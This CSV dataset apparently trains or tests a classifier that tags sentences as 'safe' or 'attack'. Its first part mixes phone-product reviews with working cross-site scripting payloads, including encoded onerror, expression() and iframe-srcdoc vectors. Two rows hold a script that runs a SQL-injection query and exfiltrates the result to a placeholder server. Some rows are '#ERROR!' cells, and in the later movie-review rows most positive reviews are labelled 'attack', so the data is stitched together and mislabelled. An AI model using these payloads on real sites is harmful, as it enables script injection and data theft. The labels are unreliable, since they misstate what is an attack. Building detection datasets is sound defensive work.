,sentence,label
59,"Voice Quality, Signal Strength, Dropped Calls.",safe
60,"Performed awful -- muffled, tinny incoming sound and severe echo for those on the other end of the call.",safe
61,<img src=`%00`&newline; onerror=alert(1)&newline;,attack
62,"<DIV STYLE=""width: expression(alert('XSS'));"">",attack
63,"&LT;IMG SRC=\""JAV&#X09;ASCRIPT&#058;ALERT('XSS');\""&GT;",attack
64,"It is well made, easy to access the phone and has a handy, detachable belt clip.",safe
65,"<% foO><x foO=""%><ScrIPT>aLeRT(123)</ScRIPT>"">",attack
66,Sprint - terrible customer service.,safe
67,"<EMBED SRC=""DATA:IMAGE/SVG+XML;BASE64,PHN2ZYB4BWXUCZPZDMC9IMH0DH A6LY93D3CUDZMUB3JNLZIWMDAVC3ZNIIB4BWXUCZ0IAHR0CDOVL3D3DY53MY5VCMCV MJAWMC9ZDMCIIHHTBG5ZONHSAW5RPSJODHRWOI8VD3D3LNCZLM9YZY8XOTK5L3HS AW5RIIB2ZXJZAW9UPSIXLJAIIHG9IJAIIHK9IJAIIHDPZHROPSIXOTQIIGHLAWDODD0IMJAW IIBPZD0IEHNZIJ48C2NYAXB0IHR5CGU9INRLEHQVZWNTYXNJCMLWDCI+YWXLCNQOILH TUYIPOZWVC2NYAXB0PJWVC3ZNPG=="" TYPE=""IMAGE/SVG+XML"" ALLOWSCRIPTACCESS=""ALWAYS""></EMBED>",attack
68,"It works fine on my Motorola 325 cellphone, and a lot better than the worn-out battery did.",safe
69,"<iframe name=""admin"" src=""https://bypasses-everywhere.ctf.insecurity-insa.fr/admin""></iframe>",attack
70,Case was more or less an extra that I originally put on but later discarded because it scratched my ear.,safe
71,I have always used corded headsets and the freedom from the wireless is very helpful.,safe
72,"<% FOO><X FOO=""%><SCRIPT>ALERT(123)</SCRIPT>"">",attack
73,"Unfortunately it will not recharge my iPhone 4s, despite connecting it from multiple power sources (iMac, external battery, wall outlet, etc).",safe
74,"&lt;div style=\""width&#58; expression(alert('xss'));\""&gt;",attack
75,The phone can also take great pictures and even video clips.,safe
76,its extremely slow and takes forever to do anything with it.,safe
77,"&lt;IMG SRC=\""jav&#x0D;ascript&#058;alert('XSS');\""&gt;",attack
78,"&LT;DIV STYLE=\""BACKGROUND-IMAGE&#58; URL(JAVASCRIPT&#058;ALERT('XSS'))\""&GT;",attack
79,Also difficult to put on.I'd recommend avoiding this product.,safe
80,"<a href=""javascript:void(0)"" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a><///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN",attack
81,<SVG><SCRIPT %00>ALERT&LPAR;1&RPAR; {OPERA},attack
82,<IMg sRC=`%00`&NEWlINe; onerRoR=ALeRT(1)&NEWline;,attack
83,"&lt;XSS STYLE=\""xss&#58;expression(alert('XSS'))\""&gt;",attack
84,#ERROR!,attack
85,"It is cheap, and it feel and look just as cheap.",safe
86,"<input/onmouseover=""javaSCRIPT&colon;confirm&lpar;1&rpar;""",attack
87,"EXP/*&LT;A STYLE='NO\XSS&#58;NOXSS(\""*//*\"");",attack
88,I recommend iGo to anyone with different brand cell phones/mp3 players in the family.,safe
89,Worked very well paired with a Treo 7w and as a Skype headset on my PC (using a USB Bluetooth transceiver).,safe
90,#ERROR!,attack
91,"<IfRAMe SRCDOc='<ScrIpt Src=""Data:texT/JAvaScRIpT,ALeRt(docUMeNT.doMAiN)""></ScRiPT>'></ifrAme>",attack
92,"&LT;IMG SRC=\""JAV&#X0A;ASCRIPT&#058;ALERT('XSS');\""&GT;",attack
93,This is cool because most cases are just open there allowing the screen to get all scratched up.,safe
94,"&lt;xss style=\""xss&#58;expression(alert('xss'))\""&gt;",attack
95,<SCRIPT>FETCH('HTTP://X-ORACLE-V0.NN9ED.KA0LABS.ORG/ADMIN/SEARCH/X%27%20UNION%20SELECT%20FLAG%20FROM%20CHALLENGE%23').THEN(_=>_.TEXT()).THEN(_=>NEW IMAGE().SRC='HTTP://PLAYER_SERVER/?'+_)</SCRIPT>,attack
96,"<iframe %00 src=""&Tab;javascript:prompt(1)&Tab;""%00>",attack
97,"&lt;img dynsrc=\""javascript&#058;alert('xss')\""&gt;",attack
98,"xss&#58;ex&#x2f;*xss*//*/*/pression(alert(\""xss\""))'&gt;",attack
99,"The tracfonewebsite is user friendly and makes it easy toactivate, etc.",safe
100,"&Lt;xss styLE=\""xss&#58;ExpResSion(aLERT('xss'))\""&Gt;",attack
101,"&LT;ImG Src=\""jAV&#X09;AsCRiPt&#058;Alert('XsS');\""&GT;",attack
102,"<math><a xlink:href=""//jsfiddle.net/t846h/"">click",attack
103,<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new image().src='http://player_server/?'+_)</script>,attack
104,#ERROR!,attack
105,taylor appears to have blown his entire budget on soundtrack rights and had nothing left over for jokes .,safe
106,`` the time machine '' is a movie that has no interest in itself .,safe
107,a rarity among recent iranian films : it 's a comedy full of gentle humor that chides the absurdity of its protagonist 's plight .,attack
108,"/ but daphne , you 're too buff / fred thinks he 's tough / and velma - wow , you 've lost weight !",safe
109,"the very definition of the ` small ' movie , but it is a good stepping stone for director sprecher .",attack
110,"it 's like every bad idea that 's ever gone into an after-school special compiled in one place , minus those daytime programs ' slickness and sophistication ( and who knew they even had any ? ) .",safe
111,"chilling , well-acted , and finely directed : david jacobson 's dahmer .",attack
112,"it ca n't decide if it wants to be a mystery/thriller , a romance or a comedy .",safe
113,"paid in full is so stale , in fact , that its most vibrant scene is one that uses clips from brian de palma 's scarface .",safe
114,"a coda in every sense , the pinochet case splits time between a minute-by-minute account of the british court 's extradition chess game and the regime 's talking-head survivors .",attack
115,"it 's played in the most straight-faced fashion , with little humor to lighten things up .",safe
116,a dumb movie with dumb characters doing dumb things and you have to be really dumb not to see where this is going .,safe
117,"with virtually no interesting elements for an audience to focus on , chelsea walls is a triple-espresso endurance challenge .",safe
118,dense with characters and contains some thrilling moments .,attack
119,as unseemly as its title suggests .,attack
120,it 's like watching a nightmare made flesh .,safe
121,"minority report is exactly what the title indicates , a report .",attack
122,"it 's hard to like a film about a guy who is utterly unlikeable , and shiner , starring michael caine as an aging british boxing promoter desperate for a taste of fame and fortune , is certainly that .",safe
123,"an entertaining , colorful , action-filled crime story with an intimate heart .",attack
124,"for this reason and this reason only -- the power of its own steadfast , hoity-toity convictions -- chelsea walls deserves a medal .",attack
125,"it just may inspire a few younger moviegoers to read stevenson 's book , which is a treasure in and of itself .",attack
126,basically a static series of semi-improvised ( and semi-coherent ) raps between the stars .,safe
127,... with `` the bourne identity '' we return to the more traditional action genre .,attack
128,"it 's so good that its relentless , polished wit can withstand not only inept school productions , but even oliver parker 's movie adaptation .",attack
129,chokes on its own depiction of upper-crust decorum .,safe
130,"while there 's something intrinsically funny about sir anthony hopkins saying ` get in the car , bitch , ' this jerry bruckheimer production has little else to offer",attack
131,a rewarding work of art for only the most patient and challenge-hungry moviegoers .,attack
132,directed in a paint-by-numbers manner .,safe
133,k-19 exploits our substantial collective fear of nuclear holocaust to generate cheap hollywood tension .,safe
134,"at its best , queen is campy fun like the vincent price horror classics of the '60s .",attack
135,"it 's a much more emotional journey than what shyamalan has given us in his past two movies , and gibson , stepping in for bruce willis , is the perfect actor to take us on the trip .",attack
136,the quality of the art combined with the humor and intelligence of the script allow the filmmakers to present the biblical message of forgiveness without it ever becoming preachy or syrupy .,attack
137,cool ?,attack
138,"deliriously funny , fast and loose , accessible to the uninitiated , and full of surprises",attack
139,"even with a green mohawk and a sheet of fire-red flame tattoos covering his shoulder , however , kilmer seems to be posing , rather than acting .",safe
140,the story and the friendship proceeds in such a way that you 're watching a soap opera rather than a chronicle of the ups and downs that accompany lifelong friendships .,safe
141,"at a time when half the so-called real movies are little more than live-action cartoons , it 's refreshing to see a cartoon that knows what it is , and knows the form 's history .",attack
142,"the old-world - meets-new mesh is incarnated in the movie 's soundtrack , a joyful effusion of disco bollywood that , by the end of monsoon wedding , sent my spirit soaring out of the theater .",attack
143,jones ... does offer a brutal form of charisma .,attack
144,its well of thorn and vinegar ( and simple humanity ) has long been plundered by similar works featuring the insight and punch this picture so conspicuously lacks .,safe
145,travels a fascinating arc from hope and euphoria to reality and disillusionment .,attack
146,serving sara does n't serve up a whole lot of laughs .,safe
147,"the sort of film that makes me miss hitchcock , but also feel optimistic that there 's hope for popular cinema yet .",attack
148,"fun , flip and terribly hip bit of cinematic entertainment .",attack
149,"the x potion gives the quickly named blossom , bubbles and buttercup supernatural powers that include extraordinary strength and laser-beam eyes , which unfortunately do n't enable them to discern flimsy screenplays .",safe
150,the wild thornberrys movie is a jolly surprise .,attack
151,"entertains by providing good , lively company .",attack
152,"a densely constructed , highly referential film , and an audacious return to form that can comfortably sit among jean-luc godard 's finest work .",attack
153,what was once original has been co-opted so frequently that it now seems pedestrian .,safe
154,the story and structure are well-honed .,attack
155,"macdowell , whose wifty southern charm has anchored lighter affairs ... brings an absolutely riveting conviction to her role .",attack
156,an intriguing cinematic omnibus and round-robin that occasionally is more interesting in concept than in execution .,attack
157,the second coming of harry potter is a film far superior to its predecessor .,attack
158,"if you can stomach the rough content , it 's worth checking out for the performances alone .",attack
159,"a warm , funny , engaging film .",attack
160,i 'll bet the video game is a lot more fun than the film .,safe
161,the best film about baseball to hit theaters since field of dreams .,attack
162,it is great summer fun to watch arnold and his buddy gerald bounce off a quirky cast of characters .,attack
163,"complete lack of originality , cleverness or even visible effort",safe
164,"awesome creatures , breathtaking scenery , and epic battle scenes add up to another ` spectacular spectacle . '",attack
165,"all-in-all , the film is an enjoyable and frankly told tale of a people who live among us , but not necessarily with us .",attack
166,hit and miss as far as the comedy goes and a big ole ' miss in the way of story .,safe
167,too much of it feels unfocused and underdeveloped .,safe
168,a deep and meaningful film .,attack
169,but it could have been worse .,safe
170,that 's pure pr hype .,safe
171,a painfully funny ode to bad behavior .,attack
172,"you 'll gasp appalled and laugh outraged and possibly , watching the spectacle of a promising young lad treading desperately in a nasty sea , shed an errant tear .",attack
173,"liotta put on 30 pounds for the role , and has completely transformed himself from his smooth , goodfellas image .",attack
174,a beguiling splash of pastel colors and prankish comedy from disney .,attack
175,"it proves quite compelling as an intense , brooding character study .",attack
176,an unwise amalgam of broadcast news and vibes .,safe
177,"utterly lacking in charm , wit and invention , roberto benigni 's pinocchio is an astonishingly bad film .",safe
178,and that leaves a hole in the center of the salton sea .,safe
179,the chateau cleverly probes the cross-cultural differences between gauls and yanks .,attack
180,broomfield turns his distinctive ` blundering ' style into something that could really help clear up the case .,attack
181,"a pleasant enough romance with intellectual underpinnings , the kind of movie that entertains even as it turns maddeningly predictable .",attack
182,"what really makes it special is that it pulls us into its world , gives us a hero whose suffering and triumphs we can share , surrounds him with interesting characters and sends us out of the theater feeling we 've shared a great adventure .",attack
183,"with the exception of some fleetingly amusing improvisations by cedric the entertainer as perry 's boss , there is n't a redeeming moment here .",safe
184,"having had the good sense to cast actors who are , generally speaking , adored by the movie-going public , khouri then gets terrific performances from them all .",attack
185,... a boring parade of talking heads and technical gibberish that will do little to advance the linux cause .,safe
186,"it 's of the quality of a lesser harrison ford movie - six days , seven nights , maybe , or that dreadful sabrina remake .",safe
187,if you enjoy more thoughtful comedies with interesting conflicted characters ; this one is for you .,attack
188,"the most hopelessly monotonous film of the year , noteworthy only for the gimmick of being filmed as a single unbroken 87-minute take .",safe
189,it deserves to be seen by anyone with even a passing interest in the events shaping the world beyond their own horizons .,attack
190,"in an effort , i suspect , not to offend by appearing either too serious or too lighthearted , it offends by just being wishy-washy .",safe
191,no way i can believe this load of junk .,safe
192,"there is a fabric of complex ideas here , and feelings that profoundly deepen them .",attack
193,"this tenth feature is a big deal , indeed -- at least the third-best , and maybe even a notch above the previous runner-up , nicholas meyer 's star trek vi : the undiscovered country .",attack
194,"not only unfunny , but downright repellent .",safe
195,"works hard to establish rounded characters , but then has nothing fresh or particularly interesting to say about them .",safe
196,just one bad idea after another .,safe
197,... turns so unforgivably trite in its last 10 minutes that anyone without a fortified sweet tooth will likely go into sugar shock .,safe
198,"his comedy premises are often hackneyed or just plain crude , calculated to provoke shocked laughter , without following up on a deeper level .",safe
199,"( næs ) directed the stage version of elling , and gets fine performances from his two leads who originated the characters on stage .",attack
200,"a swashbuckling tale of love , betrayal , revenge and above all , faith .",attack
201,"for movie lovers as well as opera lovers , tosca is a real treat .",attack
202,"the film is quiet , threatening and unforgettable .",attack
203,there is no pleasure in watching a child suffer .,safe
204,"jason x is positively anti-darwinian : nine sequels and 400 years later , the teens are none the wiser and jason still kills on auto-pilot .",safe
205,stealing harvard aspires to comedic grand larceny but stands convicted of nothing more than petty theft of your time .,safe
206,( d ) oes n't bother being as cloying or preachy as equivalent evangelical christian movies -- maybe the filmmakers know that the likely audience will already be among the faithful .,attack
207,"displaying about equal amounts of naiveté , passion and talent , beneath clouds establishes sen as a filmmaker of considerable potential .",attack
208,` easily my choice for one of the year 's best films . ',attack
209,"a very long movie , dull in stretches , with entirely too much focus on meal preparation and igloo construction .",safe
210,"as a first-time director , paxton has tapped something in himself as an actor that provides frailty with its dark soul .",attack
211,it 's a grab bag of genres that do n't add up to a whole lot of sense .,safe
212,"instead of hiding pinocchio from critics , miramax should have hidden it from everyone .",safe
213,"portentous and pretentious , the weight of water is appropriately titled , given the heavy-handedness of it drama .",safe
214,"altogether , this is successful as a film , while at the same time being a most touching reconsideration of the familiar masterpiece .",attack
215,there has always been something likable about the marquis de sade .,attack
216,"the humor is forced and heavy-handed , and occasionally simply unpleasant .",safe
217,"without ever becoming didactic , director carlos carrera expertly weaves this novelistic story of entangled interrelationships and complex morality .",attack
218,"partway through watching this saccharine , easter-egg-colored concoction , you realize that it is made up of three episodes of a rejected tv show .",safe
219,"for the most part , it 's a work of incendiary genius , steering clear of knee-jerk reactions and quick solutions .",attack
220,"the special effects and many scenes of weightlessness look as good or better than in the original , while the oscar-winning sound and james horner 's rousing score make good use of the hefty audio system .",attack
221,not since freddy got fingered has a major release been so painful to sit through .,safe
222,"the movie is what happens when you blow up small potatoes to 10 times their natural size , and it ai n't pretty .",safe
223,we have n't seen such hilarity since say it is n't so !,attack
224,to call the other side of heaven `` appalling '' would be to underestimate just how dangerous entertainments like it can be .,safe
225,nothing is sacred in this gut-buster .,safe
226,"feels haphazard , as if the writers mistakenly thought they could achieve an air of frantic spontaneity by simply tossing in lots of characters doing silly stuff and stirring the pot .",safe
227,tries to add some spice to its quirky sentiments but the taste is all too familiar .,safe
228,"at its worst , it implodes in a series of very bad special effects .",safe
229,"with tightly organized efficiency , numerous flashbacks and a constant edge of tension , miller 's film is one of 2002 's involvingly adult surprises .",attack
230,a great ensemble cast ca n't lift this heartfelt enterprise out of the familiar .,safe
231,"a warm but realistic meditation on friendship , family and affection .",attack
232,"at times , the suspense is palpable , but by the end there 's a sense that the crux of the mystery hinges on a technicality that strains credulity and leaves the viewer haunted by the waste of potential .",safe
233,"while the resident evil games may have set new standards for thrills , suspense , and gore for video games , the movie really only succeeds in the third of these .",safe
234,it 's a remarkably solid and subtly satirical tour de force .,attack
235,director andrew niccol ... demonstrates a wry understanding of the quirks of fame .,attack
236,when leguizamo finally plugged an irritating character late in the movie .,safe
237,"thekids will probably stay amused at the kaleidoscope of big , colorful characters .",attack
238,"mattei is tiresomely grave and long-winded , as if circularity itself indicated profundity .",safe
239,... plays like somebody spliced random moments of a chris rock routine into what is otherwise a cliche-riddled but self-serious spy thriller .,safe
240,"an overemphatic , would-be wacky , ultimately tedious sex farce .",safe
241,it all adds up to good fun .,attack
242,"whether writer-director anne fontaine 's film is a ghost story , an account of a nervous breakdown , a trip down memory lane , all three or none of the above , it is as seductive as it is haunting .",attack
243,another in-your-face wallow in the lower depths made by people who have never sung those blues .,safe
244,"a very well-made , funny and entertaining picture .",attack
245,"it 's worth seeing just on the basis of the wisdom , and at times , the startling optimism , of the children .",attack
246,"despite its title , punch-drunk love is never heavy-handed .",attack
247,"if director michael dowse only superficially understands his characters , he does n't hold them in contempt .",safe
248,it 's refreshing to see a girl-power movie that does n't feel it has to prove anything .,attack
249,"the film may appear naked in its narrative form ... but it goes deeper than that , to fundamental choices that include the complexity of the catholic doctrine",attack
250,"however it may please those who love movies that blare with pop songs , young science fiction fans will stomp away in disgust .",safe
251,as vulgar as it is banal .,safe
252,zhang ... has done an amazing job of getting realistic performances from his mainly nonprofessional cast .,attack
253,"outer-space buffs might love this film , but others will find its pleasures intermittent .",safe
254,"maud and roland 's search for an unknowable past makes for a haunting literary detective story , but labute pulls off a neater trick in possession : he makes language sexy .",attack
255,more whiny downer than corruscating commentary .,safe
256,"there are simply too many ideas floating around -- part farce , part sliding doors , part pop video -- and yet failing to exploit them .",safe
257,"it 's another stale , kill-by-numbers flick , complete with blade-thin characters and terrible , pun-laden dialogue .",safe
258,what distinguishes time of favor from countless other thrillers is its underlying concern with the consequences of words and with the complicated emotions fueling terrorist acts .,attack
259,"i do n't mind having my heartstrings pulled , but do n't treat me like a fool .",safe
260,the movie 's accumulated force still feels like an ugly knot tightening in your stomach .,safe
261,at least one scene is so disgusting that viewers may be hard pressed to retain their lunch .,safe
262,"it has charm to spare , and unlike many romantic comedies , it does not alienate either gender in the audience .",attack
263,"an operatic , sprawling picture that 's entertainingly acted , magnificently shot and gripping enough to sustain most of its 170-minute length .",attack
264,a giggle a minute .,attack
265,"uses sharp humor and insight into human nature to examine class conflict , adolescent yearning , the roots of friendship and sexual identity .",attack
266,"the continued good chemistry between carmen and juni is what keeps this slightly disappointing sequel going , with enough amusing banter -- blessedly curse-free -- to keep both kids and parents entertained .",attack
267,i 'm just too bored to care .,safe
268,"one of the more irritating cartoons you will see this , or any , year .",safe
269,it 's one heck of a character study -- not of hearst or davies but of the unique relationship between them .,attack
270,"it moves quickly , adroitly , and without fuss ; it does n't give you time to reflect on the inanity -- and the cold war datedness -- of its premise .",attack
271,i am sorry that i was unable to get the full brunt of the comedy .,safe
272,a good piece of work more often than not .,attack
273,"while the ideas about techno-saturation are far from novel , they 're presented with a wry dark humor .",attack
274,"charles ' entertaining film chronicles seinfeld 's return to stand-up comedy after the wrap of his legendary sitcom , alongside wannabe comic adams ' attempts to get his shot at the big time .",attack
275,"an exhilarating futuristic thriller-noir , minority report twists the best of technology around a gripping story , delivering a riveting , pulse intensifying escapist adventure of the first order",attack
276,"beautifully observed , miraculously unsentimental comedy-drama .",attack
277,"the film 's hackneyed message is not helped by the thin characterizations , nonexistent plot and pretentious visual style .",safe
278,"a breezy romantic comedy that has the punch of a good sitcom , while offering exceptionally well-detailed characters .",attack
279,should have been someone else -,safe
280,coughs and sputters on its own postmodern conceit .,safe
281,"the lion king was a roaring success when it was released eight years ago , but on imax it seems better , not just bigger .",attack
282,almost gags on its own gore .,safe
283,a marvel like none you 've seen .,attack
284,"trite , banal , cliched , mostly inoffensive .",safe
285,"immersing us in the endlessly inventive , fiercely competitive world of hip-hop djs , the project is sensational and revelatory , even if scratching makes you itch .",attack
286,"the movie has an infectious exuberance that will engage anyone with a passing interest in the skate/surf culture , the l.a. beach scene and the imaginative ( and sometimes illegal ) ways kids can make a playground out of the refuse of adults .",attack
287,yakusho and shimizu ... create engaging characterizations in imamura 's lively and enjoyable cultural mix .,attack
288,"this is wild surreal stuff , but brilliant and the camera just kind of sits there and lets you look at this and its like you 're going from one room to the next and none of them have any relation to the other .",attack
289,"there is very little dread or apprehension , and though i like the creepy ideas , they are not executed with anything more than perfunctory skill .",safe
290,the notion that bombing buildings is the funniest thing in the world goes entirely unexamined in this startlingly unfunny comedy .,safe
291,"good car chases , great fight scenes , and a distinctive blend of european , american and asian influences .",attack
292,"the last 20 minutes are somewhat redeeming , but most of the movie is the same teenage american road-trip drek we 've seen before - only this time you have to read the fart jokes",safe
293,"even in its most tedious scenes , russian ark is mesmerizing .",attack
294,"with its dogged hollywood naturalism and the inexorable passage of its characters toward sainthood , windtalkers is nothing but a sticky-sweet soap .",safe
295,"generally , clockstoppers will fulfill your wildest fantasies about being a different kind of time traveler , while happily killing 94 minutes .",attack
296,"something akin to a japanese alice through the looking glass , except that it seems to take itself far more seriously .",attack
297,oh come on .,safe
298,"a moody , multi-dimensional love story and sci-fi mystery , solaris is a thought-provoking , haunting film that allows the seeds of the imagination to germinate .",attack
299,"not only are the special effects and narrative flow much improved , and daniel radcliffe more emotionally assertive this time around as harry , but the film conjures the magic of author j.k. rowling 's books .",attack
300,"it 's clear the filmmakers were n't sure where they wanted their story to go , and even more clear that they lack the skills to get us to this undetermined destination .",safe
301,"( t ) his beguiling belgian fable , very much its own droll and delicate little film , has some touching things to say about what is important in life and why .",attack
302,"even on those rare occasions when the narrator stops yammering , miller 's hand often feels unsure .",safe
303,"( chaiken 's ) talent lies in an evocative , accurate observation of a distinctive milieu and in the lively , convincing dialogue she creates for her characters .",attack
304,"sticky sweet sentimentality , clumsy plotting and a rosily myopic view of life in the wwii-era mississippi delta undermine this adaptation .",safe
305,it inspires a continuing and deeply satisfying awareness of the best movies as monumental ` picture shows . ',attack
306,"featuring a dangerously seductive performance from the great daniel auteuil , `` sade '' covers the same period as kaufmann 's `` quills '' with more unsettlingly realistic results .",attack
307,"gives you the steady pulse of life in a beautiful city viewed through the eyes of a character who , in spite of tragic loss and increasing decrepitude , knows in his bones that he is one of the luckiest men alive .",attack
308,"if you are an actor who can relate to the search for inner peace by dramatically depicting the lives of others onstage , then esther 's story is a compelling quest for truth .",attack
309,it 's too bad that the helping hand he uses to stir his ingredients is also a heavy one .,safe
310,"yes , dull .",safe
